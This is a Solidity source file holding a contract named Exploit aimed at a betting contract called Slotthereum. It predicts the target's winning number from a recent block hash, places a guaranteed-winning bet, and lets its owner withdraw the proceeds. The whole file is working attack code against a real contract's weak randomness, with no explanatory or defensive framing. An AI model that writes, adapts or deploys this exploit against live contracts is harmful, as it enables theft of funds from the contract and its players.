// 224109999999999995 * 10 / 9 = x

contract Slotthereum {
    function placeBet(uint8 start, uint8 end) public payable returns (bool) {
    }
}

contract Exploit {
    address owner;
    uint8 pointer;
    Slotthereum target;
    
    function Exploit() {
        owner = msg.sender;
    }
    
    function attack(address a, uint8 n) payable {
        Slotthereum target = Slotthereum(a);
        pointer = n;
        uint8 win = getNumber(getBlockHash(pointer));
        target.placeBet.value(msg.value)(win, win);
    }
    
    function () payable {
        
    }
    
    function withdraw() {
        require(msg.sender == owner);
        msg.sender.transfer(this.balance);
    }
    
    function getBlockHash(uint i) internal constant returns (bytes32 blockHash) {
        if (i >= 255) {
            i = 255;
        }
        if (i <= 0) {
            i = 1;
        }
        blockHash = block.blockhash(block.number - i);
    }
    
    function getNumber(bytes32 _a) internal constant returns (uint8) {
        uint8 mint = pointer;
        for (uint i = 31; i >= 1; i--) {
            if ((uint8(_a[i]) >= 48) && (uint8(_a[i]) <= 57)) {
                return uint8(_a[i]) - 48;
            }
        }
        return mint;
    }
}